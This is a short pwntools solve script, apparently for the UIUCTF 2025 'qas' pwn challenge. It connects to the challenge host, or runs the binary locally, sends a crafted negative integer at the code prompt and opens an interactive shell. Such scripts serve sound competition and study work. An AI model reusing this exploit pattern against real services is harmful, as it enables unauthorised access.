#!/usr/bin/env python3
import sys

from pwn import *

BINARY_PATH = "/ctf-writeups/2025/uiuctf/pwn/qas/dist/chal"
REMOTE_HOST = "qas.chal.uiuc.tf"
REMOTE_PORT = 1337

context.binary = BINARY_PATH
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h", "-p 65"]

elf = context.binary

is_remote = len(sys.argv) == 2 and sys.argv[1] == "remote"


def attach(r):
    if is_remote:
        return

    bkps = []
    gdb.attach(r, "\n".join(f"break {x}" for x in bkps))


def exploit(r):
    attach(r)

    r.sendlineafter(b"code: ", b"-1433792511")
    r.interactive()


def main():
    if is_remote:
        r = remote(REMOTE_HOST, REMOTE_PORT, ssl=True)
    else:
        r = process(elf.path)

    exploit(r)


if __name__ == "__main__":
    main()
